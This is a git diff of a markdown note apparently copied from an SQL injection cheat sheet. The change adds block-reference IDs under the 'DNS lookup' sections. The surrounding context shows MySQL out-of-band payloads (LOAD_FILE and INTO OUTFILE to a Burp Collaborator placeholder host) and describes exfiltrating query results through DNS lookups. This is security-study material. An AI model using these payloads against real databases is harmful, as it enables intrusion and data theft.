@@ -122,6 +122,8 @@ You can test a single boolean condition and trigger a time delay if the conditio
 
 ## DNS lookup
 
+^f484c1
+
 You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.
 
 |            |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
@@ -132,6 +134,8 @@ You can cause the database to perform a DNS lookup to an external domain. To do 
 | MySQL      | The following techniques work on Windows only:<br><br>`LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')`  <br>`SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`                                                                                                                                                                                                                                                                                                                                                         |
 
 ## DNS lookup with data exfiltration
+
+^444252
 
 You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.
 
